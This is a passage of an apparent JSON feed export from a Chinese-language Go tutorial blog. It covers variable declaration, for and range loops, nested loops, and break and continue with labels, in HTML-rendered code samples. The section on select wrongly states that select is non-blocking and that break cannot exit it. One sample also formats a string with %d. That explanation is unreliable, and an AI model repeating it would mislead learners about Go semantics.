class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//变量的声明</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    var a string = &quot;Runoob&quot;</span><br><span class=\"line\">    fmt.Println(a)</span><br><span class=\"line\"></span><br><span class=\"line\">    var b, c int = 1, 2</span><br><span class=\"line\">    fmt.Println(b, c)</span><br><span class=\"line\"></span><br><span class=\"line\">    var d = &quot;ddd&quot;</span><br><span class=\"line\">    fmt.Println(d)</span><br><span class=\"line\"></span><br><span class=\"line\">    e := &quot;eee&quot;</span><br><span class=\"line\">    fmt.Println(e)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行得到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wRB9S2wwIBouI72F.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"go变量的声明-无初始化\"><a class=\"markdownIt-Anchor\" href=\"#go变量的声明-无初始化\">#</a> go 变量的声明 ------ 无初始化</h1>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/",
            "title": "go循环语句",
            "date_published": "2024-04-16T05:58:18.985Z",
            "content_html": "<blockquote>\n<p>因为某些情况下需要重复执行操作，因此就会有需要重复利用到的语句，就出现了循环</p>\n</blockquote>\n<h1 id=\"for循环\"><a class=\"markdownIt-Anchor\" href=\"#for循环\">#</a> for 循环</h1>\n<p>go 语言有三种形式的 for 循环</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for init; condition; post &#123; &#125;</span><br><span class=\"line\">for condition &#123; &#125;</span><br><span class=\"line\">for &#123; &#125;</span><br></pre></td></tr></table></figure>\n<p>三种形式都在 c 语言中有相对应的形式，第一种和 c 语言中的 for 循环一样，第二种则是与 c 语言中中 while 循环一样，第三种和 c 语言的 for (;😉<br>\n一样<br>\n其中第一种形式中的 init；condition；post 都代表着特定的书写，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">init： 一般为赋值表达式，给控制变量赋初值；</span><br><span class=\"line\">condition： 关系表达式或逻辑表达式，循环控制条件；</span><br><span class=\"line\">post： 一般为赋值表达式，给控制变量增量或减量。</span><br></pre></td></tr></table></figure>\n<p>for 循环的执行过程和其它编程语言一样，首先先赋初值，接着 condition 判断是否满足条件，满足则继续执行循环内的语句，结束之后再执行 post 表达式，进入下一个循环，判断 condition，如果为假则跳出循环<br>\n for 循环的 range 格式可以对<br>\n slice、map、数组、字符串等进行迭代循环，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for key, value := range oldMap &#123;</span><br><span class=\"line\">    newMap[key] = value</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上的 key 和 value 可忽略<br>\n如，只想读取 key，可以如下书写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for key := range oldMap</span><br></pre></td></tr></table></figure>\n<p>也可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for key, _ := range oldMap</span><br></pre></td></tr></table></figure>\n<p>只想读取 value 同理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for _, value := range oldMap</span><br></pre></td></tr></table></figure>\n<h2 id=\"实例1\"><a class=\"markdownIt-Anchor\" href=\"#实例1\">#</a> 实例 1：</h2>\n<p>接下来用 for 循环简单编写一个计算 1-100 的和的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    sum := 0</span><br><span class=\"line\">    for i := 0; i &lt;= 100; i++ &#123;</span><br><span class=\"line\">        sum += i</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fmt.Println(sum)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JpMseNfvwSn2fUGS.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>当然如上文所说用 c 语言的 while 格式也可以，如下：</p>\n<h2 id=\"实例2\"><a class=\"markdownIt-Anchor\" href=\"#实例2\">#</a> 实例 2：</h2>\n<p>计算 sum 自加的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    sum := 1</span><br><span class=\"line\">    for sum &lt;= 10 &#123;</span><br><span class=\"line\">        sum += sum</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fmt.Println(sum)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7BQdsYSbpFmiDMk0.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>注意这里计算 sum 自加的值，sum 的初始值不能为 0，不然一直是 0 自加永远满足条件无法跳出循环进行输出</p>\n<h2 id=\"实例3\"><a class=\"markdownIt-Anchor\" href=\"#实例3\">#</a> 实例 3：</h2>\n<p><strong>For-each range 循环</strong></p>\n<blockquote>\n<p>这种格式的循环可以对字符串、数组、切片等进行迭代输出元素。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;fmt&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    strings := []string&#123;&quot;nnnpc&quot;, &quot;good&quot;&#125;</span><br><span class=\"line\">    for i, s := range strings &#123;</span><br><span class=\"line\">        fmt.Println(i, s)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    strings1 := [6]string&#123;&quot;n&quot;, &quot;n&quot;, &quot;n&quot;, &quot;p&quot;, &quot;c&quot;&#125;</span><br><span class=\"line\">    for i, x := range strings1 &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;第 %d 位 x 的值 = %d\\n&quot;, i, x)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XO9LJ6KpZCK1UCOQ.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>以上代码可以大体分为两块，第一块是变量 strings，默认赋给了变量两个空间，分别用字符串 nnnpc 和 good 占用，利用 range 将 strings 中的 key 值和 value 值迭代赋值给变量 i 和 s，并且循环将 i，s 输出。第二块则是变量 strings1，确定了六个空间给 strings1，并且五个空间分别用字母占用，同样的将 key 值和 value 值赋给了 i，x，使用 range 来进行迭代循环输出</p>\n<p>如上文所述，可以省略 key 或者 value，只输出自己想要的，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    map1 := make(map[int]float32)</span><br><span class=\"line\">    map1[1] = 1.0</span><br><span class=\"line\">    map1[2] = 2.0</span><br><span class=\"line\">    map1[3] = 3.0</span><br><span class=\"line\">    map1[4] = 4.0</span><br><span class=\"line\"></span><br><span class=\"line\">    for key, value := range map1 &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;key is: %d - value is: %f\\n&quot;, key, value)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    for key := range map1 &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;key is: %d\\n&quot;, key)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fmt.Printf(&quot;=================省略value也可如下书写=====================\\n&quot;)</span><br><span class=\"line\">    for key, _ := range map1 &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;key is: %d\\n&quot;, key)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fmt.Printf(&quot;==========================================================\\n&quot;)</span><br><span class=\"line\">    for _, value := range map1 &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;value is: %f\\n&quot;, value)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KHvRRhBqoBYKIJw1.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>第一个 for 循环二者均输出，第二、三个只输出 key，第四个只输出 value</p>\n<h1 id=\"循环嵌套\"><a class=\"markdownIt-Anchor\" href=\"#循环嵌套\">#</a> 循环嵌套</h1>\n<p>顾名思义就是在循环内嵌套循环</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for [condition |  ( init; condition; increment ) | Range]</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   for [condition |  ( init; condition; increment ) | Range]</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">      statement(s);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   statement(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实例\"><a class=\"markdownIt-Anchor\" href=\"#实例\">#</a> 实例：</h2>\n<p>输出 2-100 之间的素数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   var i, j int</span><br><span class=\"line\">   for i=2; i &lt; 100; i++ &#123;</span><br><span class=\"line\">      for j=2; j &lt;= (i/j); j++ &#123;</span><br><span class=\"line\">         if(i%j==0) &#123;</span><br><span class=\"line\">            break; // 如果发现因子，则不是素数</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      if(j &gt; (i/j)) &#123;</span><br><span class=\"line\">         fmt.Printf(&quot;%d  是素数\\n&quot;, i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IM55zggVj7CdbSdF.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"循环控制语句\"><a class=\"markdownIt-Anchor\" href=\"#循环控制语句\">#</a> 循环控制语句</h1>\n<blockquote>\n<p>循环控制语句可以控制循环体内语句的执行过程。</p>\n</blockquote>\n<h2 id=\"break语句\"><a class=\"markdownIt-Anchor\" href=\"#break语句\">#</a> break 语句</h2>\n<blockquote>\n<p>在 Go 语言中，break 语句用于终止当前循环或者 switch<br>\n 语句的执行，并跳出该循环或者 switch 语句的代码块。<br>\nbreak 语句可以用于以下几个方面：<br>\n1. 用于循环语句中跳出循环，并开始执行循环之后的语句。<br>\n2.break 在 switch 语句中在执行一条 case 后跳出语句的作用。<br>\n3.break 可应用在 select 语句中。<br>\n4. 在多重循环中，可以用标号 label 标出想 break 的循环。</p>\n</blockquote>\n<p>实例 1：在 for 循环中使用 break 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    for i := 0; i &lt; 10; i++ &#123;</span><br><span class=\"line\">        if i == 5 &#123;</span><br><span class=\"line\">            break</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        fmt.Println(i)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q4QDlJ6hitCu3We0.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>以上简单的 break 程序当 i 等于 5 的时候跳出循环</p>\n<p>接着说明使用标记与不使用标记的区别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   // 不使用标记</span><br><span class=\"line\">   fmt.Println(&quot;---- break ----&quot;)</span><br><span class=\"line\">   for i := 1; i &lt;= 3; i++ &#123;</span><br><span class=\"line\">      fmt.Printf(&quot;i: %d\\n&quot;, i)</span><br><span class=\"line\">      for i2 := 11; i2 &lt;= 13; i2++ &#123;</span><br><span class=\"line\">         fmt.Printf(&quot;i2: %d\\n&quot;, i2)</span><br><span class=\"line\">         break</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   // 使用标记</span><br><span class=\"line\">   fmt.Println(&quot;---- break label ----&quot;)</span><br><span class=\"line\">   re:</span><br><span class=\"line\">      for i := 1; i &lt;= 3; i++ &#123;</span><br><span class=\"line\">         fmt.Printf(&quot;i: %d\\n&quot;, i)</span><br><span class=\"line\">         for i2 := 11; i2 &lt;= 13; i2++ &#123;</span><br><span class=\"line\">         fmt.Printf(&quot;i2: %d\\n&quot;, i2)</span><br><span class=\"line\">         break re</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QWdvhj56cAOkLJ6x.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>添加标记能 break 掉标记指定的循环语句，而没有标记只能 break 当前 break 所在的循环</p>\n<p>实例 2：在 switch 语句中使用 break</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    day := &quot;Tuesday&quot;</span><br><span class=\"line\">    switch day &#123;</span><br><span class=\"line\">    case &quot;Monday&quot;:</span><br><span class=\"line\">        fmt.Println(&quot;It&#x27;s Monday.&quot;)</span><br><span class=\"line\">    case &quot;Tuesday&quot;:</span><br><span class=\"line\">        fmt.Println(&quot;It&#x27;s Tuesday.&quot;)</span><br><span class=\"line\">        break</span><br><span class=\"line\">    case &quot;Wednesday&quot;:</span><br><span class=\"line\">        fmt.Println(&quot;It&#x27;s Wednesday.&quot;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>刚开始给 day 声明赋值为 Tuesday 而 switch 语句中 case 也是 Tuesday 时执行 break，也就是输出 It’s<br>\nTuesday 并跳出 switch 语句<br>\n输出：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mFT2vZPWNnznKn4d.png!thumbnail\" alt=\"\"></p>\n<p>实例 3：在 select 语句中使用 break</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;fmt&quot;</span><br><span class=\"line\">    &quot;time&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    ch1 := make(chan int)</span><br><span class=\"line\">    ch2 := make(chan int)</span><br><span class=\"line\">    go func() &#123;</span><br><span class=\"line\">        time.Sleep(2 * time.Second)</span><br><span class=\"line\">        ch1 &lt;- 1</span><br><span class=\"line\">    &#125;()</span><br><span class=\"line\">    go func() &#123;</span><br><span class=\"line\">        time.Sleep(1 * time.Second)</span><br><span class=\"line\">        ch2 &lt;- 2</span><br><span class=\"line\">    &#125;()</span><br><span class=\"line\">    select &#123;</span><br><span class=\"line\">    case &lt;-ch1:</span><br><span class=\"line\">        fmt.Println(&quot;Received from ch1.&quot;)</span><br><span class=\"line\">    case &lt;-ch2:</span><br><span class=\"line\">        fmt.Println(&quot;Received from ch2.&quot;)</span><br><span class=\"line\">        break // 跳出 select 语句</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71ZBT5zD4b0kgqUh.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<blockquote>\n<p>在 Go 语言中，break 语句在 select 语句中的应用是相对特殊的。由于<br>\n select 语句的特性，break 语句并不能直接用于跳出 select 语句本身，因为<br>\n select<br>\n 语句是非阻塞的，它会一直等待所有的通信操作都准备就绪。如果需要提前结束<br>\n select 语句的执行，可以使用 return 或者 goto 语句来达到相同的效果。<br>\n由于 select 语句是非阻塞的，因此 braek 不能直接跳出 select 语句本身，可以使用 return 和 goto 来达到提前结束 select 语句的效果，如下</p>\n</blockquote>\n<p>return：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;fmt&quot;</span><br><span class=\"line\">    &quot;time&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\">func process(ch chan int) &#123;</span><br><span class=\"line\">    for &#123;</span><br><span class=\"line\">        select &#123;</span><br><span class=\"line\">        case val := &lt;-ch:</span><br><span class=\"line\">            fmt.Println(&quot;Received value:&quot;, val)</span><br><span class=\"line\">            if val == 5 &#123;</span><br><span class=\"line\">                return</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        default:</span><br><span class=\"line\">            fmt.Println(&quot;No value received yet.&quot;)</span><br><span class=\"line\">            time.Sleep(500 * time.Millisecond)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    ch := make(chan int)</span><br><span class=\"line\">    go process(ch)</span><br><span class=\"line\">    time.Sleep(2 * time.Second)</span><br><span class=\"line\">    ch &lt;- 1</span><br><span class=\"line\">    time.Sleep(1 * time.Second)</span><br><span class=\"line\">    ch &lt;- 3</span><br><span class=\"line\">    time.Sleep(1 * time.Second)</span><br><span class=\"line\">    ch &lt;- 5</span><br><span class=\"line\">    time.Sleep(1 * time.Second)</span><br><span class=\"line\">    ch &lt;- 7</span><br><span class=\"line\">    time.Sleep(2 * time.Second)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HY7TfTCc534yWLYM.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>可以看到整个程序段最终接收到 7，也就是 val==7，但由于在循环中当接收到的变量值为 5 时进行了 return 操作，效果相当于跳出了 select 语句，也就不会进行后续的接收 7 的操作了</p>\n<blockquote>\n<p>通过使用 return，我们可以在 select<br>\n 语句中提前终止执行，并返回到调用者的代码中。<br>\n需要注意的是，使用 return<br>\n 语句会立即终止当前的函数执行，所以请根据实际需求来决定在 select<br>\n 语句中使用何种方式来提前结束执行。</p>\n</blockquote>\n<h2 id=\"continue语句\"><a class=\"markdownIt-Anchor\" href=\"#continue语句\">#</a> continue 语句</h2>\n<blockquote>\n<p>Go 语言的 continue 语句 有点像 break 语句。但是 continue<br>\n 不是跳出循环，而是跳过当前循环执行下一次循环语句。<br>\nfor 循环中，执行 continue 语句会触发 for 增量语句的执行。<br>\n在多重循环中，可以用标号 label 标出想 continue 的循环。</p>\n</blockquote>\n<p>通俗的来讲 continue 的作用就是跳过本次循环执行下一次循环</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   /* 定义局部变量 */</span><br><span class=\"line\">   var a int = 10</span><br><span class=\"line\">   /* for 循环 */</span><br><span class=\"line\">   for a &lt; 20 &#123;</span><br><span class=\"line\">      if a == 15 &#123;</span><br><span class=\"line\">         /* 跳过此次循环 */</span><br><span class=\"line\">         a = a + 1;</span><br><span class=\"line\">         continue;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      fmt.Printf(&quot;a 的值为 : %d\\n&quot;, a);</span><br><span class=\"line\">      a++;    </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2fgVJ2xlGcD9sXat.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>该程序当 a 的值为 15 时就跳过该次循环，也就是不执行输出和自加，通过 a=a+1 之后执行下一次的循环，因此输出里面没有值为 15</p>\n<p>接下来记录一下使用和不使用标记的区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    // 不使用标记</span><br><span class=\"line\">    fmt.Println(&quot;---- continue ---- &quot;)</span><br><span class=\"line\">    for i := 1; i &lt;= 3; i++ &#123;</span><br><span class=\"line\">        fmt.Printf(&quot;i: %d\\n&quot;, i)</span><br><span class=\"line\">            for i2 := 11; i2 &lt;= 13; i2++ &#123;</span><br><span 